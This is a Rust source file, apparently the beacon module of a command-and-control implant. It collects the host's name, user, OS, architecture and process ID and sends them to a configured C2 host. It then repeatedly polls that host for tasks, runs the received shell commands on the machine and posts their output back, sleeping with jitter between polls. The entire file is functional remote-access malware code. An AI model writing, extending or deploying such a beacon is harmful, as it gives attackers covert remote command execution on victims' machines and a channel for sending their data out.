/// beacon.rs: main beacon loop: check-in -> poll tasks -> execute -> submit results.

use serde::{Deserialize, Serialize};
use std::time::Duration;

use crate::config::{C2_HOST, JITTER_SECS, SLEEP_SECS};
use crate::executor::run_shell;

#[derive(Serialize)]
struct CheckinPayload<'a> {
    uuid: &'a str,
    hostname: &'a str,
    username: &'a str,
    os: &'a str,
    arch: &'a str,
    pid: u32,
    sleep: u64,
    jitter: u64,
}

#[derive(Deserialize)]
struct Task {
    task_id: String,
    #[serde(rename = "type")]
    task_type: String,
    payload: serde_json::Value,
}

#[derive(Deserialize)]
struct TaskList {
    tasks: Vec<Task>,
}

#[derive(Serialize)]
struct TaskResult<'a> {
    task_id: &'a str,
    #[serde(rename = "type")]
    task_type: &'a str,
    exit_code: i32,
    stdout: &'a str,
    stderr: &'a str,
    exec_time_ms: u128,
}

// helpers

fn sys_hostname() -> String {
    #[cfg(target_os = "linux")]
    {
        std::fs::read_to_string("/etc/hostname")
            .unwrap_or_default()
            .trim()
            .to_string()
    }
    #[cfg(not(target_os = "linux"))]
    {
        std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_string())
    }
}

fn sys_username() -> String {
    std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_else(|_| "unknown".to_string())
}

fn sys_os() -> String {
    #[cfg(target_os = "linux")]
    {
        if let Ok(content) = std::fs::read_to_string("/etc/os-release") {
            for line in content.lines() {
                if line.starts_with("PRETTY_NAME=") {
                    return line
                        .trim_start_matches("PRETTY_NAME=")
                        .trim_matches('"')
                        .to_string();
                }
            }
        }
        "Linux".to_string()
    }
    #[cfg(not(target_os = "linux"))]
    {
        format!(
            "Windows {}",
            std::env::var("OS").unwrap_or_else(|_| "Unknown".to_string())
        )
    }
}

fn jittered_sleep() {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let delta = rng.gen_range(0..=(JITTER_SECS * 2)) as i64 - JITTER_SECS as i64;
    let actual = ((SLEEP_SECS as i64) + delta).max(1) as u64;
    eprintln!("[beacon] sleeping {}s", actual);
    std::thread::sleep(Duration::from_secs(actual));
}

pub fn run(beacon_uuid: &str, client: &reqwest::blocking::Client) {
    let hostname = sys_hostname();
    let username = sys_username();
    let os = sys_os();
    let arch = std::env::consts::ARCH.to_string();
    let pid = std::process::id();

    loop {
        // beacon check in
        let checkin_url = format!("{C2_HOST}/api/beacon/checkin");
        let payload = CheckinPayload {
            uuid: beacon_uuid,
            hostname: &hostname,
            username: &username,
            os: &os,
            arch: &arch,
            pid,
            sleep: SLEEP_SECS,
            jitter: JITTER_SECS,
        };

        match client.post(&checkin_url).json(&payload).send() {
            Ok(resp) if resp.status().is_success() => {
                eprintln!("[beacon] checked in OK");
            }
            Ok(resp) => {
                eprintln!("[beacon] checkin non-200: {}", resp.status());
                jittered_sleep();
                continue;
            }
            Err(e) => {
                eprintln!("[beacon] checkin error: {e}");
                jittered_sleep();
                continue;
            }
        }

        // poll for tasks
        let tasks_url = format!("{C2_HOST}/api/beacon/{beacon_uuid}/tasks");
        let tasks: Vec<Task> = match client.get(&tasks_url).send() {
            Ok(resp) if resp.status().is_success() => {
                resp.json::<TaskList>().map(|tl| tl.tasks).unwrap_or_default()
            }
            Ok(resp) => {
                eprintln!("[beacon] task poll non-200: {}", resp.status());
                vec![]
            }
            Err(e) => {
                eprintln!("[beacon] task poll error: {e}");
                vec![]
            }
        };

        // execute each task and submit results
        for task in tasks {
            eprintln!("[beacon] executing task {} ({})", task.task_id, task.task_type);

            match task.task_type.as_str() {
                "shell" => {
                    let cmd = task.payload["cmd"]
                        .as_str()
                        .unwrap_or("echo 'no cmd'");
                    let exec = run_shell(cmd);

                    let result = TaskResult {
                        task_id: &task.task_id,
                        task_type: "shell",
                        exit_code: exec.exit_code,
                        stdout: &exec.stdout,
                        stderr: &exec.stderr,
                        exec_time_ms: exec.exec_time_ms,
                    };

                    let result_url =
                        format!("{C2_HOST}/api/beacon/{beacon_uuid}/result");
                    match client.post(&result_url).json(&result).send() {
                        Ok(_) => eprintln!("[beacon] result submitted OK"),
                        Err(e) => eprintln!("[beacon] result submit error: {e}"),
                    }
                }
                unknown => {
                    eprintln!("[beacon] unknown task type: {unknown}");
                }
            }
        }

        // sleep with jitter before next iteration
        jittered_sleep();
    }
}
